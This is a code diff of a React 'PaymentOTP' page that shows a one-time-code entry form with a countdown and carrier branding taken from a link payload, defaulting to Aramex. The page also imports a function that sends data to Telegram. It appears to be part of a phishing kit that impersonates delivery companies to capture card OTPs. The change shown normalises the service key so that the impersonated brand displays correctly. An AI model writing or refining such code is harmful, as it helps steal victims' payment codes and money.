@@ -8,7 +8,7 @@ import { usePayment, useUpdatePayment, useLink } from "@/hooks/useSupabase";
 import { sendToTelegram } from "@/lib/telegram";
 import { Shield, AlertCircle, Check, Lock, Clock, X } from "lucide-react";
 import { useToast } from "@/hooks/use-toast";
-import { getServiceBranding } from "@/lib/serviceLogos";
+import { getServiceBranding, normalizeServiceKey } from "@/lib/serviceLogos";
 import {
   InputOTP,
   InputOTPGroup,
@@ -29,8 +29,9 @@ const PaymentOTP = () => {
   const [timeLeft, setTimeLeft] = useState(180); // 3 minutes countdown
   
   // Get service branding
-  const serviceKey = link?.payload?.service_key || link?.payload?.service || link?.payload?.carrier || 'aramex';
-  const serviceName = link?.payload?.service_name || serviceKey;
+  const rawServiceKey = link?.payload?.service_key || link?.payload?.service || link?.payload?.carrier || 'aramex';
+  const serviceName = link?.payload?.service_name || rawServiceKey;
+  const serviceKey = normalizeServiceKey(rawServiceKey, serviceName);
   const branding = getServiceBranding(serviceKey);
   
   // Countdown timer
